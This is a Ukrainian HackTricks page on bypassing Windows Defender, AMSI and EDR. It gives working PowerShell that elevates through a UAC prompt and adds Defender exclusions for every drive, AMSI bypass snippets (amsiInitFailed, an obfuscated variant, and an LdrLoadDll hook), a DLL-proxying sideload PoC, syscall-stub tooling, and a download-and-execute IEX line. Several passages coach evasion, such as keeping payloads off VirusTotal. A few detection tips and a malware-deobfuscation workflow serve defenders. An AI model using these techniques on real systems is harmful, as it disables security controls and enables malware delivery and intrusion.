# Обхід Antivirus (AV)

{{#include ../banners/hacktricks-training.md}}

**Цю сторінку спочатку написав** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Зупинка Defender

- [defendnot](https://github.com/es3n1n/defendnot): Інструмент для зупинки роботи Windows Defender.
- [no-defender](https://github.com/es3n1n/no-defender): Інструмент для зупинки роботи Windows Defender із фальсифікацією іншого AV.
- [Disable Defender if you are admin](basic-powershell-for-pentesters/README.md)

### Installer-style UAC bait before tampering with Defender

Публічні loaders, замасковані під game cheats, часто постачаються як непідписані Node.js/Nexe installers, які спочатку **запитують у користувача підвищення привілеїв**, а потім вимикають Defender. Процес простий:

1. Перевірити наявність адміністративного контексту за допомогою `net session`. Команда успішно виконується лише тоді, коли caller має права адміністратора, тому помилка означає, що loader працює від імені standard user.
2. Негайно повторно запустити себе з дієсловом `RunAs`, щоб викликати очікуваний запит згоди UAC, зберігаючи початковий command line.
```powershell
if (-not (net session 2>$null)) {
powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
exit
}
```
Жертви вже вважають, що встановлюють «cracked» software, тому запит зазвичай приймається, надаючи malware права, необхідні для зміни політики Defender.<sup>[[26]](#references)</sup>

### Загальні виключення `MpPreference` для кожної літери диска

Після підвищення привілеїв ланцюжки на кшталт GachiLoader максимізують сліпі зони Defender, замість того щоб повністю вимикати службу. Спочатку loader завершує роботу GUI watchdog (`taskkill /F /IM SecHealthUI.exe`), а потім додає **надзвичайно широкі виключення**, через які кожен профіль користувача, системний каталог і знімний диск стають недоступними для сканування:
```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```
Ключові спостереження:

- Цикл проходить по кожній змонтованій файловій системі (D:\, E:\, USB-накопичувачі тощо), тому **будь-яке майбутнє payload, розміщене в будь-якому місці на диску, буде проігноровано**.
- Виключення розширення `.sys` орієнтоване на майбутнє — атакувальники залишають за собою можливість пізніше завантажувати unsigned drivers, не взаємодіючи з Defender повторно.
- Усі зміни потрапляють до `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions`, завдяки чому наступні етапи можуть підтвердити збереження виключень або розширити їх без повторного запуску UAC.

Оскільки жодна служба Defender не зупиняється, наївні перевірки стану продовжують повідомляти «антивірус активний», хоча перевірка в реальному часі фактично не охоплює ці шляхи.<sup>[[26]](#references)</sup>

## **AV Evasion Methodology**

Наразі AV використовують різні методи перевірки того, чи є файл malicious: static detection, dynamic analysis, а в більш просунутих EDR — behavioural analysis.

### **Static detection**

Static detection здійснюється шляхом виявлення відомих malicious strings або масивів байтів у binary чи script, а також вилучення інформації безпосередньо з файлу (наприклад, опису файлу, назви компанії, digital signatures, іконки, checksum тощо). Це означає, що використання відомих публічних інструментів може швидше призвести до виявлення, оскільки їх, імовірно, уже проаналізували та позначили як malicious. Існує кілька способів обійти такий тип виявлення:

- **Encryption**

Якщо ви зашифруєте binary, AV не зможе виявити вашу програму, але вам знадобиться певний loader, щоб розшифрувати та запустити програму в пам’яті.

- **Obfuscation**

Іноді достатньо змінити кілька рядків у binary або script, щоб пройти перевірку AV, але залежно від того, що саме ви намагаєтеся обфускувати, це може бути тривалим процесом.

- **Custom tooling**

Якщо ви розробляєте власні інструменти, відомих bad signatures не буде, але це потребує багато часу та зусиль.

> [!TIP]
> Хорошим способом перевірки на static detection у Windows Defender є [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Він фактично розділяє файл на кілька сегментів, а потім доручає Defender сканувати кожен із них окремо, завдяки чому може точно показати, які рядки або байти у вашому binary були позначені.

Наполегливо рекомендую переглянути цей [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) про практичний AV Evasion.

### **Dynamic analysis**

Dynamic analysis — це коли AV запускає ваш binary у sandbox і спостерігає за malicious activity (наприклад, спробами розшифрувати та прочитати паролі з browser, створенням minidump для LSASS тощо). Із цією частиною може бути дещо складніше працювати, але ось кілька речей, які можна робити для обходу sandbox.

- **Sleep before execution** Залежно від реалізації, це може бути чудовим способом обійти dynamic analysis AV. AV має дуже мало часу на сканування файлів, щоб не переривати робочий процес користувача, тому тривалі sleep можуть завадити аналізу binary. Проблема в тому, що багато AV sandbox можуть просто пропустити sleep залежно від способу його реалізації.
- **Checking machine's resources** Зазвичай Sandbox мають дуже обмежені ресурси (наприклад, < 2GB RAM), інакше вони могли б уповільнювати роботу машини користувача. Тут також можна проявити креативність, наприклад перевіряти температуру CPU або навіть швидкість обертання вентиляторів — у sandbox може бути реалізовано не все.
- **Machine-specific checks** Якщо ви хочете націлитися на користувача, чия workstation приєднана до домену "contoso.local", можна перевірити домен комп’ютера та порівняти його із заданим. Якщо він не збігається, можна завершити роботу програми.

Виявилося, що computername у Microsoft Defender's Sandbox — HAL9TH, тож перед detonation можна перевірити ім’я комп’ютера у вашому malware. Якщо ім’я збігається з HAL9TH, це означає, що ви перебуваєте всередині defender's sandbox, і тоді можна завершити роботу програми.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>джерело: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Ще кілька справді хороших порад від [@mgeeky](https://twitter.com/mariuszbit) щодо протидії Sandbox

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> канал #malware-dev</p></figcaption></figure>

Як ми вже зазначали раніше в цій публікації, **public tools** зрештою **будуть виявлені**, тож варто поставити собі запитання:

Наприклад, якщо ви хочете зробити dump LSASS, **чи справді вам потрібно використовувати mimikatz**? Чи можна використати інший, менш відомий project, який також робить dump LSASS?

Правильна відповідь, імовірно, друга. Якщо взяти mimikatz як приклад, це, напевно, один із найбільш, якщо не найбільш, позначених AV та EDR malware. Сам project надзвичайно крутий, але водночас із ним дуже складно працювати для обходу AV, тому просто шукайте alternatives для досягнення потрібної мети.

> [!TIP]
> Під час модифікації ваших payloads для evasion обов’язково **вимкніть automatic sample submission** у defender і, будь ласка, серйозно: **НЕ ЗАВАНТАЖУЙТЕ ЇХ НА VIRUSTOTAL**, якщо ваша мета — забезпечити evasion у довгостроковій перспективі. Якщо ви хочете перевірити, чи виявляє ваш payload певний AV, встановіть його на VM, спробуйте вимкнути automatic sample submission і тестуйте там, доки не будете задоволені результатом.

## EXEs vs DLLs

Коли це можливо, завжди **надавайте пріоритет використанню DLL для evasion**. З мого досвіду, DLL files зазвичай **виявляються та аналізуються набагато рідше**, тому в деяких випадках це дуже простий спосіб уникнути виявлення (якщо ваш payload, звісно, може працювати як DLL).

Як видно на цьому зображенні, DLL Payload від Havoc має detection rate 4/26 на antiscan.me, тоді як EXE payload має detection rate 7/26.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>порівняння на antiscan.me звичайного Havoc EXE payload зі звичайним Havoc DLL</p></figcaption></figure>

Тепер ми покажемо кілька tricks, які можна використовувати з DLL files, щоб зробити їх значно stealthier.

## DLL Sideloading & Proxying

**DLL Sideloading** використовує порядок пошуку DLL, який застосовує loader, розміщуючи victim application і malicious payload(s) поруч один з одним.

Перевірити програми, вразливі до DLL Sideloading, можна за допомогою [Siofra](https://github.com/Cybereason/siofra) та наведеного powershell script:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
Ця команда виведе список програм, уразливих до DLL hijacking, у каталозі "C:\Program Files\\" і DLL-файлів, які вони намагаються завантажити.

Я наполегливо рекомендую **самостійно досліджувати DLL Hijackable/Sideloadable programs**. За належного виконання ця техніка є доволі непомітною, але якщо ви використовуєте загальновідомі DLL Sideloadable programs, вас можуть легко виявити.

Просте розміщення шкідливої DLL з іменем, яке програма очікує завантажити, не призведе до завантаження вашого payload, оскільки програма очікує наявності в цій DLL певних функцій. Щоб виправити цю проблему, ми використаємо іншу техніку під назвою **DLL Proxying/Forwarding**.

**DLL Proxying** перенаправляє виклики, які програма здійснює до proxy (і шкідливої) DLL, до оригінальної DLL, зберігаючи функціональність програми та забезпечуючи можливість виконання вашого payload.

Я використовуватиму проєкт [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) від [@flangvik](https://twitter.com/Flangvik/)

Ось кроки, яких я дотримувався:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
Остання команда надасть нам 2 файли: шаблон вихідного коду DLL і оригінальну перейменовану DLL.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
Ось результати:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

І наш shellcode (закодований за допомогою [SGN](https://github.com/EgeBalci/sgn), і proxy DLL мають показник Detection 0/26 на [antiscan.me](https://antiscan.me)! Це можна вважати успіхом.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Я **настійно рекомендую** переглянути [VOD S3cur3Th1sSh1t на twitch](https://www.twitch.tv/videos/1644171543) про DLL Sideloading, а також [відео ippsec](https://www.youtube.com/watch?v=3eROsG_WNpE), щоб дізнатися більше про те, що ми обговорили, у більшій глибині.

### Abusing Forwarded Exports (ForwardSideLoading)

Модулі Windows PE можуть експортувати функції, які насправді є "forwarders": замість вказівника на код запис експорту містить ASCII-рядок у форматі `TargetDll.TargetFunc`. Коли caller виконує resolve експорту, Windows loader:

- Завантажує `TargetDll`, якщо його ще не завантажено
- Виконує resolve `TargetFunc` із нього

Ключові особливості, які потрібно розуміти:
- Якщо `TargetDll` є KnownDLL, він надається із захищеного namespace KnownDLLs (наприклад, ntdll, kernelbase, ole32).<sup>[[15]](#references)</sup>
- Якщо `TargetDll` не є KnownDLL, використовується звичайний порядок пошуку DLL, який включає директорію модуля, що виконує forward resolution.

Це створює примітив непрямого sideloading: потрібно знайти підписану DLL, яка експортує функцію, перенаправлену до назви модуля, що не є KnownDLL, а потім розмістити цю підписану DLL разом із контрольованою attacker DLL, названою точно так само, як перенаправлений цільовий модуль. Коли викликається forwarded export, loader виконує forward resolution і завантажує вашу DLL із тієї самої директорії, виконуючи ваш DllMain.<sup>[[13]](#references)</sup>

Приклад, зафіксований у Windows 11:
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll` не є KnownDLL, тому його пошук виконується за звичайним порядком пошуку.

PoC (copy-paste):
1) Скопіюйте підписану системну DLL у папку, доступну для запису
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Помістіть шкідливий `NCRYPTPROV.dll` у ту саму папку. Для виконання коду достатньо мінімальної DllMain; реалізовувати перенаправлену функцію для запуску DllMain не потрібно.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) Активуйте пересилання за допомогою підписаного LOLBin:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
Observed behavior:
- rundll32 (підписаний) завантажує side-by-side `keyiso.dll` (підписаний)
- Під час розв’язання `KeyIsoSetAuditingInterface` loader переходить за forward до `NCRYPTPROV.SetAuditingInterface`
- Після цього loader завантажує `NCRYPTPROV.dll` із `C:\test` і виконує його `DllMain`
- Якщо `SetAuditingInterface` не реалізовано, помилка "missing API" виникне лише після того, як `DllMain` уже буде виконано

Hunting tips:
- Зосередьтеся на forwarded exports, де цільовий модуль не є KnownDLL. KnownDLLs перелічені в `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- Ви можете перелічити forwarded exports за допомогою таких інструментів:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Перегляньте інвентаризацію forwarder для Windows 11, щоб знайти кандидатів: https://hexacorn.com/d/apis_fwd.txt<sup>[[14]](#references)</sup>

Ідеї для виявлення/захисту:
- Відстежуйте LOLBins (наприклад, rundll32.exe), які завантажують підписані DLL із не системних шляхів, після чого завантажують non-KnownDLLs з такою самою базовою назвою з цього каталогу
- Створюйте сповіщення для ланцюжків процесів/модулів на кшталт: `rundll32.exe` → не системний `keyiso.dll` → `NCRYPTPROV.dll` у шляхах, доступних для запису користувачем
- Застосовуйте політики цілісності коду (WDAC/AppLocker) і забороняйте write+execute у каталогах застосунків

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze — це payload toolkit для обходу EDR за допомогою призупинених процесів, direct syscalls і альтернативних методів виконання`

Ви можете використовувати Freeze для прихованого завантаження та виконання свого shellcode.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evasion — це лише гра в кішки-мишки: те, що працює сьогодні, завтра може бути виявлено, тому ніколи не покладайтеся лише на один інструмент; якщо можливо, спробуйте поєднувати кілька технік evasion.

## Прямі/непрямі Syscalls і розв'язання SSN (SysWhispers4)

EDR часто встановлюють **user-mode inline hooks** на syscall stubs у `ntdll.dll`. Щоб обійти ці hooks, можна згенерувати **direct** або **indirect** syscall stubs, які завантажують правильний **SSN** (System Service Number) і здійснюють перехід у kernel mode, не виконуючи hooked export entrypoint.<sup>[[32]](#references)</sup>

**Варіанти виклику:**
- **Direct (embedded)**: вставляє інструкцію `syscall`/`sysenter`/`SVC #0` у згенерований stub (без звернення до export `ntdll`).
- **Indirect**: переходить до наявного `syscall` gadget усередині `ntdll`, завдяки чому перехід до kernel mode виглядає так, ніби він походить із `ntdll` (корисно для евasion евристик); **randomized indirect** обирає gadget із pool для кожного виклику.
- **Egg-hunt**: уникає вбудовування статичної opcode-послідовності `0F 05` на диску; знаходить syscall sequence під час виконання.

**Стійкі до hooks стратегії розв'язання SSN:**
- **FreshyCalls (VA sort)**: визначає SSN, сортуючи syscall stubs за virtual address замість читання байтів stub.
- **SyscallsFromDisk**: відображає чистий `\KnownDlls\ntdll.dll`, читає SSN з її `.text`, а потім скасовує відображення (обходить усі hooks у пам'яті).
- **RecycledGate**: поєднує визначення SSN через VA sort із перевіркою opcode, коли stub є чистим; у разі hook повертається до визначення через VA.
- **HW Breakpoint**: встановлює DR0 на інструкцію `syscall` і використовує VEH для отримання SSN з `EAX` під час виконання, не аналізуючи hooked bytes.

Приклад використання SysWhispers4:
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```
## AMSI (Anti-Malware Scan Interface)

AMSI було створено для запобігання "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)". Спочатку AV могли сканувати лише **файли на диску**, тому, якщо вам вдавалося якимось чином виконати payload **безпосередньо в пам'яті**, AV не міг цьому запобігти, оскільки не мав достатньої видимості.

Функцію AMSI інтегровано в такі компоненти Windows.

- User Account Control, або UAC (підвищення привілеїв для встановлення EXE, COM, MSI або ActiveX)
- PowerShell (скрипти, інтерактивне використання та динамічна оцінка коду)
- Windows Script Host (wscript.exe і cscript.exe)
- JavaScript і VBScript
- макроси Office VBA

Вона дає змогу antivirus-рішенням перевіряти поведінку скриптів, надаючи вміст скриптів у формі, яка є одночасно незашифрованою та необфускованою.

Виконання `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` спричинить таке сповіщення в Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Зверніть увагу, як він додає на початку `amsi:`, а потім шлях до виконуваного файлу, з якого було запущено скрипт, у цьому випадку powershell.exe

Ми не записували жодного файлу на диск, але все одно були виявлені в пам'яті через AMSI.

Крім того, починаючи з **.NET 4.8**, C#-код також проходить через AMSI. Це навіть впливає на `Assembly.Load(byte[])`, який використовується для завантаження виконання в пам'яті. Саме тому для виконання в пам'яті рекомендується використовувати нижчі версії .NET (наприклад, 4.7.2 або нижче), якщо ви хочете обійти AMSI.

Є кілька способів обійти AMSI:

- **Obfuscation**

Оскільки AMSI переважно працює зі статичними виявленнями, модифікація скриптів, які ви намагаєтеся завантажити, може бути хорошим способом уникнути виявлення.

Однак AMSI здатен деобфускувати скрипти, навіть якщо вони мають кілька рівнів обфускації, тому обфускація може бути невдалим варіантом залежно від способу її виконання. Через це обхід не є таким простим. Водночас іноді достатньо змінити лише кілька імен змінних — і все працюватиме, тож це залежить від того, наскільки щось було позначено як підозріле.

- **AMSI Bypass**

Оскільки AMSI реалізовано шляхом завантаження DLL у процес powershell (а також cscript.exe, wscript.exe тощо), нею можна легко маніпулювати навіть під непривілейованим користувачем. Через цю ваду в реалізації AMSI дослідники знайшли кілька способів обійти сканування AMSI.

**Forcing an Error**

Примусове завершення ініціалізації AMSI з помилкою (amsiInitFailed) призведе до того, що для поточного процесу сканування не запускатиметься. Спочатку це було розкрито [Matt Graeber](https://twitter.com/mattifestation), після чого Microsoft розробила сигнатуру для запобігання широкому використанню цього методу.
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
Усе, що знадобилося, — це один рядок коду powershell, щоб зробити AMSI непридатним для використання в поточному процесі powershell. Звісно, цей рядок було виявлено самим AMSI, тому для використання цієї техніки потрібна певна модифікація.

Ось модифікований AMSI bypass, який я взяв із цього [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Keep in mind, that this will probably get flagged once this post comes out, so you should not publish any code if your plan is staying undetected.

**Memory Patching**

Цю техніку вперше виявив [@RastaMouse](https://twitter.com/_RastaMouse/). Вона передбачає пошук адреси функції "AmsiScanBuffer" у amsi.dll (відповідає за сканування введених користувачем даних) і перезапис її інструкціями для повернення коду E_INVALIDARG. У результаті фактичного сканування буде повернуто 0, що інтерпретується як безпечний результат.

> [!TIP]
> Будь ласка, прочитайте [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) для детальнішого пояснення.

Також існує багато інших технік обходу AMSI за допомогою powershell. Перегляньте [**цю сторінку**](basic-powershell-for-pentesters/index.html#amsi-bypass) і [**цей repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell), щоб дізнатися більше про них.

### Blocking AMSI by preventing amsi.dll load (LdrLoadDll hook)

AMSI ініціалізується лише після завантаження `amsi.dll` у поточний процес. Надійний language-agnostic bypass полягає у встановленні user-mode hook на `ntdll!LdrLoadDll`, який повертає помилку, якщо запитуваним модулем є `amsi.dll`. У результаті AMSI ніколи не завантажується, і для цього процесу сканування не виконуються.<sup>[[23]](#references)</sup>

Загальна схема реалізації (x64 C/C++ pseudocode):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
if (module && module->Buffer){
UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
if (RtlEqualUnicodeString(module, &amsi, TRUE)){
// Pretend the DLL cannot be found → AMSI never initialises in this process
return STATUS_DLL_NOT_FOUND; // 0xC0000135
}
}
return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
// Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
// e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Примітки
- Працює в PowerShell, WScript/CScript і власних loaders (у всіх випадках, коли інакше завантажувався б AMSI).
- Поєднуйте з передаванням скриптів через stdin (`PowerShell.exe -NoProfile -NonInteractive -Command -`), щоб уникнути довгих артефактів командного рядка.
- Використовувався loaders, запущеними через LOLBins (наприклад, `regsvr32`, що викликає `DllRegisterServer`).

Інструмент **[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** також генерує скрипт для обходу AMSI.
Інструмент **[https://amsibypass.com/](https://amsibypass.com/)** також генерує скрипт для обходу AMSI, який уникає сигнатур завдяки рандомізованим користувацьким функціям, змінним і виразам із символів, а також застосовує випадковий регістр до ключових слів PowerShell, щоб уникнути сигнатур.

**Видалення виявленої сигнатури**

Ви можете використовувати такий інструмент, як **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** і **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)**, щоб видалити виявлену сигнатуру AMSI з пам’яті поточного процесу. Цей інструмент сканує пам’ять поточного процесу на наявність сигнатури AMSI, а потім перезаписує її інструкціями NOP, фактично видаляючи її з пам’яті.

**Продукти AV/EDR, які використовують AMSI**

Список продуктів AV/EDR, які використовують AMSI, можна знайти в **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Використовуйте PowerShell версії 2**
Якщо ви використовуєте PowerShell версії 2, AMSI не завантажується, тому ви можете запускати свої скрипти без сканування AMSI. Це можна зробити так:
```bash
powershell.exe -version 2
```
## Ведення журналу PS

Ведення журналу PowerShell — це функція, яка дає змогу записувати всі команди PowerShell, виконані в системі. Це може бути корисним для аудиту й усунення несправностей, але водночас може бути **проблемою для attackers, які хочуть уникнути виявлення**.

Щоб обійти ведення журналу PowerShell, можна використовувати такі техніки:

- **Вимкнення PowerShell Transcription і Module Logging**: для цього можна використати такий інструмент, як [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs).
- **Використання Powershell версії 2**: якщо використовувати PowerShell версії 2, AMSI не завантажується, тому скрипти можна запускати без сканування AMSI. Це можна зробити так: `powershell.exe -version 2`
- **Використання unmanaged-сесії PowerShell**: використовуйте [UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell), щоб розмістити PowerShell без запуску `powershell.exe` (підхід, який використовується `powerpick` у Cobalt Strike). Це обходить засоби контролю, прив’язані саме до процесу `powershell.exe`, але саме по собі не вимикає AMSI, Script Block Logging чи інші засоби захисту PowerShell; охоплення залежить від runtime і реалізації host.


## Обфускація

> [!TIP]
> Кілька технік обфускації покладаються на шифрування даних, що збільшує entropy бінарного файлу й полегшує його виявлення AV та EDR. Будьте обережні й, можливо, застосовуйте шифрування лише до окремих частин коду, які є чутливими або мають бути приховані.

### Деобфускація .NET-бінарних файлів, захищених ConfuserEx

Під час аналізу malware, який використовує ConfuserEx 2 (або комерційні forks), часто доводиться мати справу з кількома рівнями захисту, що блокують decompilers і sandboxes. Наведений нижче workflow надійно **відновлює майже оригінальний IL**, який після цього можна decompile у C# за допомогою таких інструментів, як dnSpy або ILSpy.<sup>[[10]](#references)</sup>

1.  Видалення anti-tampering — ConfuserEx шифрує кожне *тіло методу* й розшифровує його всередині статичного конструктора (`<Module>.cctor`) *модуля*. Він також змінює PE checksum, тому будь-яка модифікація призведе до аварійного завершення бінарного файлу. Використовуйте **AntiTamperKiller**, щоб знайти зашифровані таблиці metadata, відновити XOR keys і перезаписати чисту assembly:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
Вивід містить 6 anti-tamper parameters (`key0-key3`, `nameHash`, `internKey`), які можуть бути корисними під час створення власного unpacker.

2.  Відновлення symbol / control-flow — передайте *чистий* файл у **de4dot-cex** (fork de4dot із підтримкою ConfuserEx).
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Прапорці:
• `-p crx` — вибір профілю ConfuserEx 2
• de4dot скасує control-flow flattening, відновить оригінальні namespaces, classes та names змінних і розшифрує constant strings.

3.  Видалення proxy calls — ConfuserEx замінює прямі виклики методів легкими wrappers (так звані *proxy calls*), щоб ще більше ускладнити decompilation. Видаліть їх за допомогою **ProxyCall-Remover**:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
Після цього кроку замість непрозорих wrapper functions (`Class8.smethod_10`, …) мають з’явитися звичайні .NET API, такі як `Convert.FromBase64String` або `AES.Create()`.

4.  Ручне очищення — запустіть отриманий бінарний файл у dnSpy, виконайте пошук великих Base64 blobs або використання `RijndaelManaged`/`TripleDESCryptoServiceProvider`, щоб знайти *справжній* payload. Часто malware зберігає його як TLV-encoded byte array, ініціалізований усередині `<Module>.byte_0`.

Наведений вище ланцюжок відновлює execution flow **без необхідності запускати malicious sample** — це корисно під час роботи на offline workstation.

> 🛈  ConfuserEx створює custom attribute з назвою `ConfusedByAttribute`, який можна використовувати як IOC для автоматичного triage samples.

#### Однорядкова команда
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Мета цього проєкту — надати open-source fork пакета компіляції [LLVM](http://www.llvm.org/), здатний підвищити безпеку програмного забезпечення за допомогою [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) і захисту від підробки.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator демонструє, як використовувати мову `C++11/14` для генерації obfuscated code під час компіляції без використання зовнішніх інструментів і без модифікації компілятора.
- [**obfy**](https://github.com/fritzone/obfy): Додає шар obfuscated operations, згенерованих фреймворком C++ template metaprogramming, що трохи ускладнить життя людині, яка хоче crack application.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz — це x64 binary obfuscator, здатний obfuscate різні PE files, зокрема: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame — це простий metamorphic code engine для довільних executable files.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator — це fine-grained code obfuscation framework для мов, які підтримує LLVM, із використанням ROP (return-oriented programming). ROPfuscator обфускує програму на рівні assembly code, перетворюючи звичайні instructions на ROP chains і руйнуючи наше природне уявлення про звичайний control flow.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt — це .NET PE Crypter, написаний мовою Nim
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor здатний конвертувати наявні EXE/DLL у shellcode, а потім завантажувати їх

## SmartScreen & MoTW

Можливо, ви вже бачили цей екран під час завантаження деяких executable files з інтернету та їх виконання.

Microsoft Defender SmartScreen — це механізм безпеки, призначений для захисту кінцевого користувача від запуску потенційно шкідливих застосунків.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen переважно працює на основі репутації: рідко завантажувані застосунки активують SmartScreen, який попереджає кінцевого користувача та не дозволяє виконати файл (хоча файл усе ще можна виконати, натиснувши More Info -> Run anyway).

**MoTW** (Mark of The Web) — це [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) з назвою Zone.Identifier, який автоматично створюється під час завантаження файлів з інтернету разом із URL-адресою, з якої його було завантажено.

